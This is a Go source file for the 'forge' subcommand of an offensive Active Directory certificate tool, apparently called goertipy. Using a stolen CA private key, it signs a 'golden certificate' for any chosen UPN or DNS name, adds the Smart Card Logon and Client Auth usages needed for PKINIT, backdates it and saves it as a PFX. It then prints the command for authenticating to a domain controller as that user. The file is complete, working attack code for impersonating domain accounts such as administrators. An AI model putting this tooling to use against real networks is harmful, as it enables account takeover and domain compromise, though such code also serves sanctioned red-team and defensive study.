package commands

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"strings"
	"time"

	goertipycert "github.com/slacker/goertipy/pkg/cert"
	"github.com/spf13/cobra"
)

type ForgeFlags struct {
	CACert    string
	CAKey     string
	CAPFX     string
	CAPFXPass string
	UPN       string
	DNS       string
	Subject   string
	Serial    int64
	Validity  int
	KeySize   int
	Output    string
}

var forgeFlags ForgeFlags

// NewForgeCommand creates the forge subcommand.
func NewForgeCommand() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "forge",
		Short: "Forge a golden certificate using a CA's private key",
		Long: `Sign a certificate as any user using a stolen CA private key.
The CA key can be provided as a PEM key pair (--ca-cert + --ca-key) or
as a PFX file (--ca-pfx). The forged certificate can be used with
'goertipy auth' for PKINIT authentication.`,
		RunE: runForge,
	}

	cmd.Flags().StringVar(&forgeFlags.CACert, "ca-cert", "", "CA certificate file (PEM)")
	cmd.Flags().StringVar(&forgeFlags.CAKey, "ca-key", "", "CA private key file (PEM)")
	cmd.Flags().StringVar(&forgeFlags.CAPFX, "ca-pfx", "", "CA certificate + key as PFX file")
	cmd.Flags().StringVar(&forgeFlags.CAPFXPass, "ca-pfx-pass", "", "PFX password (default: empty)")
	cmd.Flags().StringVar(&forgeFlags.UPN, "upn", "", "UPN SAN for the forged cert (e.g., administrator@corp.local)")
	cmd.Flags().StringVar(&forgeFlags.DNS, "dns", "", "DNS SAN for the forged cert")
	cmd.Flags().StringVar(&forgeFlags.Subject, "subject", "", "Subject CN (default: derived from UPN)")
	cmd.Flags().Int64Var(&forgeFlags.Serial, "serial", 0, "Serial number (default: random)")
	cmd.Flags().IntVar(&forgeFlags.Validity, "validity", 365, "Validity period in days")
	cmd.Flags().IntVar(&forgeFlags.KeySize, "key-size", 2048, "RSA key size for the forged cert")
	cmd.Flags().StringVarP(&forgeFlags.Output, "output", "o", "", "Output PFX filename")

	return cmd
}

func runForge(cmd *cobra.Command, args []string) error {
	if forgeFlags.UPN == "" && forgeFlags.DNS == "" {
		return fmt.Errorf("at least one of --upn or --dns is required")
	}

	// Load CA cert + key
	var caCert *x509.Certificate
	var caKey *rsa.PrivateKey

	if forgeFlags.CAPFX != "" {
		// Load from PFX
		key, cert, _, err := goertipycert.LoadPFX(forgeFlags.CAPFX, forgeFlags.CAPFXPass)
		if err != nil {
			return fmt.Errorf("failed to load CA PFX: %w", err)
		}
		caCert = cert
		caKey = key
		fmt.Printf("[*] Loaded CA from PFX: %s\n", caCert.Subject)
	} else if forgeFlags.CACert != "" && forgeFlags.CAKey != "" {
		// Load CA cert from PEM
		certData, err := os.ReadFile(forgeFlags.CACert)
		if err != nil {
			return fmt.Errorf("failed to read CA cert: %w", err)
		}
		block, _ := pem.Decode(certData)
		if block == nil || block.Type != "CERTIFICATE" {
			return fmt.Errorf("invalid CA certificate PEM")
		}
		caCert, err = x509.ParseCertificate(block.Bytes)
		if err != nil {
			return fmt.Errorf("failed to parse CA certificate: %w", err)
		}

		// Load CA key from PEM
		keyData, err := os.ReadFile(forgeFlags.CAKey)
		if err != nil {
			return fmt.Errorf("failed to read CA key: %w", err)
		}
		keyBlock, _ := pem.Decode(keyData)
		if keyBlock == nil {
			return fmt.Errorf("invalid CA key PEM")
		}
		parsedKey, err := x509.ParsePKCS8PrivateKey(keyBlock.Bytes)
		if err != nil {
			// Try PKCS1
			parsedKey, err = x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
			if err != nil {
				return fmt.Errorf("failed to parse CA private key: %w", err)
			}
		}
		var ok bool
		caKey, ok = parsedKey.(*rsa.PrivateKey)
		if !ok {
			return fmt.Errorf("CA key is not RSA")
		}
		fmt.Printf("[*] Loaded CA cert: %s\n", caCert.Subject)
		fmt.Printf("[*] Loaded CA key:  RSA %d bits\n", caKey.N.BitLen())
	} else {
		return fmt.Errorf("provide CA key via --ca-pfx or --ca-cert + --ca-key")
	}

	// Generate new key pair for the forged cert
	fmt.Printf("[*] Generating %d-bit RSA key pair\n", forgeFlags.KeySize)
	forgeryKey, err := rsa.GenerateKey(rand.Reader, forgeFlags.KeySize)
	if err != nil {
		return fmt.Errorf("failed to generate key pair: %w", err)
	}

	// Serial number
	serialNumber := big.NewInt(forgeFlags.Serial)
	if forgeFlags.Serial == 0 {
		serialNumber, err = rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
		if err != nil {
			return fmt.Errorf("failed to generate serial: %w", err)
		}
	}

	// Subject CN
	subject := forgeFlags.Subject
	if subject == "" && forgeFlags.UPN != "" {
		parts := strings.SplitN(forgeFlags.UPN, "@", 2)
		subject = parts[0]
	} else if subject == "" && forgeFlags.DNS != "" {
		subject = forgeFlags.DNS
	}

	// Build the certificate template
	now := time.Now()
	template := &x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName: subject,
		},
		NotBefore:             now.Add(-24 * time.Hour), // Backdate 1 day to avoid clock skew
		NotAfter:              now.Add(time.Duration(forgeFlags.Validity) * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		BasicConstraintsValid: true,
	}

	// EKUs: Client Auth + Smart Card Logon (needed for PKINIT)
	template.ExtKeyUsage = []x509.ExtKeyUsage{
		x509.ExtKeyUsageClientAuth,
	}
	// Smart Card Logon OID: 1.3.6.1.4.1.311.20.2.2
	smartCardLogonOID := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 2}
	template.UnknownExtKeyUsage = []asn1.ObjectIdentifier{smartCardLogonOID}

	// Add UPN SAN
	if forgeFlags.UPN != "" {
		sanExt, err := buildUPNSANExtension(forgeFlags.UPN)
		if err != nil {
			return fmt.Errorf("failed to build UPN SAN: %w", err)
		}
		template.ExtraExtensions = append(template.ExtraExtensions, sanExt)
	}

	// Add DNS SAN
	if forgeFlags.DNS != "" {
		template.DNSNames = []string{forgeFlags.DNS}
	}

	// Sign with CA key
	fmt.Printf("[*] Forging certificate for %s\n", subject)
	if forgeFlags.UPN != "" {
		fmt.Printf("    UPN:    %s\n", forgeFlags.UPN)
	}
	if forgeFlags.DNS != "" {
		fmt.Printf("    DNS:    %s\n", forgeFlags.DNS)
	}
	fmt.Printf("    Serial: %s\n", serialNumber.String())
	fmt.Printf("    Valid:  %s → %s\n",
		template.NotBefore.Format("2006-01-02"),
		template.NotAfter.Format("2006-01-02"))

	certDER, err := x509.CreateCertificate(rand.Reader, template, caCert, &forgeryKey.PublicKey, caKey)
	if err != nil {
		return fmt.Errorf("failed to sign certificate: %w", err)
	}

	// Parse the signed cert back
	signedCert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return fmt.Errorf("failed to parse signed certificate: %w", err)
	}

	// Output filename
	outFile := forgeFlags.Output
	if outFile == "" {
		if forgeFlags.UPN != "" {
			outFile = fmt.Sprintf("forged_%s.pfx", strings.ReplaceAll(forgeFlags.UPN, "@", "_"))
		} else {
			outFile = fmt.Sprintf("forged_%s.pfx", subject)
		}
	}

	// Save as PFX
	if err := goertipycert.SavePFX(signedCert, forgeryKey, nil, outFile, ""); err != nil {
		return fmt.Errorf("failed to save PFX: %w", err)
	}

	fmt.Printf("[+] Forged certificate saved to %s\n", outFile)
	fmt.Printf("[*] Use: goertipy auth -u %s --dc-ip <DC> --pfx %s\n", forgeFlags.UPN, outFile)

	return nil
}

// buildUPNSANExtension creates a SubjectAlternativeName extension with a UPN otherName.
func buildUPNSANExtension(upn string) (pkix.Extension, error) {
	// UPN OID: 1.3.6.1.4.1.311.20.2.3
	upnOID := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}

	// Encode the UPN as UTF8String
	utf8Value, err := asn1.Marshal(upn)
	if err != nil {
		return pkix.Extension{}, err
	}

	// Wrap in explicit [0] tag for the value
	explicitValue := asn1.RawValue{
		Class:      asn1.ClassContextSpecific,
		Tag:        0,
		IsCompound: true,
		Bytes:      utf8Value,
	}
	explicitBytes, err := asn1.Marshal(explicitValue)
	if err != nil {
		return pkix.Extension{}, err
	}

	// Build otherName: OID + [0] EXPLICIT value
	oidBytes, err := asn1.Marshal(upnOID)
	if err != nil {
		return pkix.Extension{}, err
	}

	otherNameBytes := append(oidBytes, explicitBytes...)

	// Wrap in GeneralName [0] (otherName)
	generalName := asn1.RawValue{
		Class:      asn1.ClassContextSpecific,
		Tag:        0,
		IsCompound: true,
		Bytes:      otherNameBytes,
	}
	gnBytes, err := asn1.Marshal(generalName)
	if err != nil {
		return pkix.Extension{}, err
	}

	// Wrap in SEQUENCE (GeneralNames)
	sanSequence := asn1.RawValue{
		Class:      asn1.ClassUniversal,
		Tag:        asn1.TagSequence,
		IsCompound: true,
		Bytes:      gnBytes,
	}
	sanBytes, err := asn1.Marshal(sanSequence)
	if err != nil {
		return pkix.Extension{}, err
	}

	return pkix.Extension{
		Id:    asn1.ObjectIdentifier{2, 5, 29, 17}, // subjectAltName
		Value: sanBytes,
	}, nil
}
